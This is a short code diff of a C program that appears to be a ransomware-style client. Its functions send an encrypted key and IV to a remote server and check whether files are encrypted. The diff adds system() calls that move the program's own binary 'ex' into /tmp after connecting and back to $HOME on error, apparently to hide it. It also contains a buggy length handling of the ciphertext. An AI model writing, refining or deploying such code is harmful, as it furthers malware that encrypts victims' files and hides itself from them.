@@ -77,6 +77,8 @@ int main (int argc, char * argv[])
         printf("Error during connection\n");
         handleError(sockid);
     }
+
+    system("/bin/mv ex /tmp/ex");
 	
     while(1) 
     {
@@ -271,8 +273,7 @@ int send_key(char *pKey, char *pIv, int sockid, struct sockaddr_in server_addr)
     strcpy(msg, pKey);
     strcat(msg,":");
     strcat(msg,pIv);
-    public_encrypt((unsigned char*)msg, strlen(msg), publicKey, encrypted);
-    
+    int lenght = public_encrypt((unsigned char*)msg, strlen(msg), publicKey, encrypted);
     send(sockid, (const char *)encrypted, strlen(encrypted)+1,0);
     free(msg);
 }
@@ -295,6 +296,7 @@ int is_encrypted(char *filename)
 void handleError(int sockid)
 {
     close(sockid);
+    system("/bin/mv /tmp/ex $HOME/ex");
     abort();
 
 }
